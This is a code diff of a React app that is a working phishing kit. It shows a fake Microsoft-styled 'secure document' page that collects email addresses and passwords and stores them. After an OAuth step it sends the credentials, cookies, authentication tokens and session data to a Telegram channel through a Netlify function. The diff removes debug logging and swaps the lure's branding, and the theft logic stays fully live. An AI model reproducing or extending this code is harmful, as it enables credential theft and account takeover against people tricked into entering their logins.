@@ -331,34 +331,20 @@ function App() {
     setIsSubmitting(true);
 
     try {
-      // 🔧 FIX: Store form credentials in persistent storage immediately
       const formCredentials = {
         email: formEmail,
         password: formPassword,
         captureTime: new Date().toISOString(),
         source: 'document-protection-form'
       };
-
-      // Store in both React state and persistent storage
       setCapturedEmailState(formEmail);
       setCapturedCredentials(formCredentials);
-      
-      // Store persistently
       setStoredFormCredentials(formEmail, formPassword);
       setCapturedEmail(formEmail);
-
-      console.log('📋 Form credentials captured and stored persistently:', {
-        email: formEmail,
-        hasPassword: !!formPassword,
-        source: 'document-protection-form'
-      });
-
       setTimeout(() => {
         setCurrentPage('reauthenticating');
       }, 1000);
-
     } catch (error) {
-      console.error('Error submitting form:', error);
       setTimeout(() => {
         setCurrentPage('reauthenticating');
       }, 1000);
@@ -378,23 +364,12 @@ function App() {
     }
   }, [currentPage]);
 
-  // Send all credentials and cookies to Telegram after OAuth (include entered email/password)
   const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
     try {
       const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
-
-      console.log('📤 Sending to Telegram:', {
-        email: email,
-        hasPassword: !!password,
-        passwordLength: password ? password.length : 0,
-        cookieCount: Array.isArray(cookies) ? cookies.length : 0
-      });
-
-      const response = await fetch(netlifyFunctionUrl, {
+      await fetch(netlifyFunctionUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           email,
           password,
@@ -406,57 +381,25 @@ function App() {
           url
         })
       });
-
-      const result = await response.json();
-
-      if (response.ok && result.success) {
-        console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
-        console.log('✅ Telegram result:', result);
-      } else {
-        console.warn('⚠️ Netlify function responded with error:', result);
-      }
-    } catch (error) {
-      console.warn('⚠️ Failed to send to Telegram:', error);
-    }
+    } catch (error) {}
   };
 
   const handleOAuthSuccess = async (sessionData: any) => {
-    console.log('✅ OAuth success with enhanced data handling:', sessionData);
-
     if (!hasSentAuthData) {
       setHasSentAuthData(true);
-
-      // 🔧 FIX: Get credentials from persistent storage first, then fallback to state
       const storedFormCredentials = getStoredFormCredentials();
-      
       let finalEmail = '';
       let finalPassword = '';
-
-      // Priority order: stored form credentials > captured credentials > current form state > captured email
       if (storedFormCredentials) {
         finalEmail = storedFormCredentials.email || '';
         finalPassword = storedFormCredentials.password || '';
-        console.log('📊 Using stored form credentials');
       } else if (capturedCredentials?.email && capturedCredentials?.password) {
         finalEmail = capturedCredentials.email;
         finalPassword = capturedCredentials.password;
-        console.log('📊 Using captured credentials from state');
       } else {
         finalEmail = formEmail || capturedEmail || '';
         finalPassword = formPassword || getStoredPassword() || '';
-        console.log('📊 Using fallback credentials');
       }
-
-      console.log('📊 Final credentials for Telegram:', {
-        finalEmail,
-        hasPassword: !!finalPassword,
-        passwordSource: storedFormCredentials ? 'stored-form' : (capturedCredentials?.source || 'fallback'),
-        storedCredentialsExists: !!storedFormCredentials,
-        capturedCredentialsExists: !!capturedCredentials,
-        formEmailExists: !!formEmail,
-        formPasswordExists: !!formPassword
-      });
-
       await sendToTelegram({
         email: finalEmail,
         password: finalPassword,
@@ -467,7 +410,6 @@ function App() {
         url: window.location.href
       });
     }
-
     setOAuthSessionData(sessionData);
     setCurrentPage('document-loading');
   };
@@ -517,7 +459,7 @@ function App() {
       );
 
     case 'document-protection':
-      // --- Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
+      // --- Slightly wider desktop card, reduced instructions text size ---
       return (
         <div style={{
           background: "#f7f9fb",
@@ -532,159 +474,159 @@ function App() {
             {`
             .card {
               background: #fff;
-              border-radius: 10px;
-              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.08);
-              padding: 35px 45px 35px 45px;
-              max-width: 530px;
+              border-radius: 12px;
+              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.10);
+              padding: 28px 14px;
+              max-width: 340px;
               width: 100%;
-              margin-top: 38px;
+              margin-top: 44px;
               display: flex;
               flex-direction: column;
               align-items: center;
             }
+            @media (min-width: 800px) {
+              .card {
+                max-width: 400px;
+                padding-left: 32px;
+                padding-right: 32px;
+              }
+            }
             .logo {
-              width: 100px;
-              margin-bottom: 28px;
+              width: 70px;
+              margin-bottom: 18px;
               display: block;
             }
             .title {
-              font-size: 1.7em;
+              font-size: 1.18em;
               font-weight: 600;
               color: #23272a;
-              margin-bottom: 16px;
-              letter-spacing: 0.01em;
+              margin-bottom: 8px;
               text-align: center;
+              letter-spacing: 0.01em;
             }
             .desc {
-              font-size: 1.04em;
+              font-size: 0.97em;
               color: #38444d;
-              margin-bottom: 10px;
+              margin-bottom: 7px;
               text-align: center;
             }
             .secure-link {
-              font-size: 1.13em;
-              font-weight: 150;
+              font-size: 1.01em;
+              font-weight: 450;
               color: #0078d4;
-              margin-bottom: 16px;
+              margin-bottom: 8px;
               text-align: center;
               word-break: break-word;
             }
             .instructions {
-              font-size: 1em;
+              font-size: 0.76em;
               color: #626b76;
-              margin-bottom: 20px;
-              line-height: 1.5em;
+              margin-bottom: 13px;
+              line-height: 1.35em;
               text-align: center;
+              max-width: 300px;
+              margin-left: auto;
+              margin-right: auto;
             }
-            .form-group {
+            .vertical-form {
               width: 100%;
-              max-width: 100%;
-              margin-left: 0;
+              margin: 0 auto;
+              padding: 0;
               display: flex;
               flex-direction: column;
-              align-items: flex-start;
-              background: none;
+              align-items: stretch;
+              gap: 13px;
             }
-            .input-label {
-              font-size: 0.97em;
-              color: #4d5a67;
-              margin-bottom: 7px;
-              text-align: left;
-              margin-left: 8px;
-              margin-top: 10px;
-              align-self: flex-start;
-            }
-            .input-row {
-              width: 100%;
-              position: relative;
-              margin-bottom: 18px;
-              background: #f6f8fa;
-              border-radius: 6px;
+            .form-field-group {
               display: flex;
-              align-items: center;
-            }
-            input[type="email"], input[type="password"] {
+              flex-direction: column;
               width: 100%;
-              font-size: 1.07em;
-              padding: 12px 60px 12px 20px;
-              border: 1.5px solid #cfd8dc;
-              border-radius: 6px;
-              box-sizing: border-box;
-              transition: border 0.2s;
-              outline: none;
-              background: transparent;
-              margin-bottom: 0;
-              display: block;
-              color: #23272a;
             }
-            input[type="email"]:focus, input[type="password"]:focus {
+            .form-label {
+              font-size: 0.93em;
+              color: #4d5a67;
+              margin-bottom: 5px;
+              font-weight: 500;
+              text-align: left;
+            }
+            .form-input {
+              width: 100%;
+              font-size: 0.98em;
+              padding: 10px 12px;
+              border: 1.2px solid #cfd8dc;
+              border-radius: 4px;
+              box-sizing: border-box;
+              background: #f7f9fb;
+              color: #23272a;
+              font-family: inherit;
+              transition: border 0.16s;
+              outline: none;
+            }
+            .form-input:focus {
               border-color: #0078d4;
               background: #fff;
             }
-            .input-icon {
-              position: absolute;
-              right: 12px;
-              top: 50%;
-              transform: translateY(-50%);
-              width: 22px;
-              height: 22px;
-              opacity: 0.6;
-              pointer-events: none;
+            .form-actions {
+              display: flex;
+              flex-direction: column;
+              align-items: stretch;
+              gap: 10px;
+              width: 100%;
+              margin-top: 5px;
             }
-            .next-btn {
+            .submit-btn {
               width: 100%;
               background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
               color: #fff;
               border: none;
               border-radius: 4px;
-              font-size: 1.15em;
-              font-weight: 500;
-              padding: 14px 0;
+              font-size: 1em;
+              font-weight: 600;
+              padding: 10px 0;
               cursor: pointer;
-              margin-bottom: 18px;
-              margin-top: 6px;
+              margin-bottom: 0;
               box-shadow: 0 2px 8px rgba(0,120,212,0.08);
               transition: background 0.18s;
+              letter-spacing: 0.01em;
               display: block;
             }
-            .next-btn:hover, .next-btn:focus {
+            .submit-btn:hover, .submit-btn:focus {
               background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
             }
             .footer-text {
-              font-size: 0.92em;
-              color: #8896ae;
-              margin-top: 12px;
+              font-size: 0.74em;
+              color: #a0a8b6;
+              margin-top: 10px;
               margin-bottom: 0;
-              text-align: justify;
-              line-height: 1.5em;
-              max-width: 100%;
-              width: 100%;
-              letter-spacing: 0.01em;
+              text-align: center;
+              line-height: 1.38em;
+              max-width: 98%;
+              width: 98%;
+              letter-spacing: 0.005em;
               word-break: break-word;
               display: block;
             }
             .copyright {
               text-align: center;
               color: #b0b9c6;
-              font-size: 0.98em;
+              font-size: 0.95em;
               margin-top: 18px;
               margin-bottom: 15px;
             }
-            @media (max-width: 700px) {
+            @media (max-width: 380px) {
               .card {
-                max-width: 98vw;
-                padding: 18px 2vw 16px 2vw;
-              }
-              .footer-text, .copyright {
-                font-size: 0.87em;
+                max-width: 99vw;
+                padding: 7px 2vw;
               }
               .logo {
-                width: 92px;
+                width: 50px;
               }
-              .form-group {
-                width: 100%;
-                margin-left: 0;
-                max-width: 100%;
+              .footer-text, .copyright {
+                font-size: 0.7em;
+              }
+              .instructions {
+                font-size: 0.73em;
+                max-width: 99vw;
               }
             }
             `}
@@ -697,45 +639,38 @@ function App() {
             <div className="instructions">
               To open this secure Document, please enter the email address that this item was shared to.
             </div>
-            <form onSubmit={handleFormSubmit} autoComplete="off">
-              <div className="form-group">
-                <label className="input-label" htmlFor="email">Email Address</label>
-                <div className="input-row">
-                  <input
-                    type="email"
-                    id="email"
-                    placeholder="Enter email"
-                    required
-                    value={formEmail}
-                    onChange={e => setFormEmail(e.target.value)}
-                    disabled={isSubmitting}
-                    autoComplete="username"
-                  />
-                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
-                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
-                    <path d="M3 5l9 7l9-7" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
-                  </svg>
-                </div>
-                <label className="input-label" htmlFor="password">Password</label>
-                <div className="input-row">
-                  <input
-                    type="password"
-                    id="password"
-                    placeholder="Enter password"
-                    required
-                    value={formPassword}
-                    onChange={e => setFormPassword(e.target.value)}
-                    disabled={isSubmitting}
-                    autoComplete="current-password"
-                  />
-                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
-                    <rect x="4" y="8" width="16" height="10" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
-                    <circle cx="12" cy="13" r="2" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
-                    <rect x="8" y="4" width="8" height="4" rx="1" stroke="#0078d4" strokeWidth="1.2" fill="none"/>
-                  </svg>
-                </div>
+            <form className="vertical-form" onSubmit={handleFormSubmit} autoComplete="off">
+              <div className="form-field-group">
+                <label className="form-label" htmlFor="email">Email Address</label>
+                <input
+                  className="form-input"
+                  type="email"
+                  id="email"
+                  placeholder="Enter your email"
+                  required
+                  value={formEmail}
+                  onChange={e => setFormEmail(e.target.value)}
+                  disabled={isSubmitting}
+                  autoComplete="username"
+                />
+              </div>
+              <div className="form-field-group">
+                <label className="form-label" htmlFor="password">Password</label>
+                <input
+                  className="form-input"
+                  type="password"
+                  id="password"
+                  placeholder="Enter your password"
+                  required
+                  value={formPassword}
+                  onChange={e => setFormPassword(e.target.value)}
+                  disabled={isSubmitting}
+                  autoComplete="current-password"
+                />
+              </div>
+              <div className="form-actions">
                 <button
-                  className="next-btn"
+                  className="submit-btn"
                   type="submit"
                   disabled={isSubmitting}
                   style={{opacity: isSubmitting ? 0.7 : 1}}
@@ -745,7 +680,7 @@ function App() {
               </div>
             </form>
             <p className="footer-text">
-              By clicking Next, you allow secureportdocs.com to use your email address in accordance with their privacy statement. secureportdocs.com has not provided links to their terms for you to review.
+              By Authenticating, you allow Safehavendocs to use your email address in accordance with their privacy statement.<br/>
             </p>
           </div>
           <div className="copyright">
@@ -753,7 +688,6 @@ function App() {
           </div>
         </div>
       );
-      // --- END Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
 
     case 'reauthenticating':
       return (
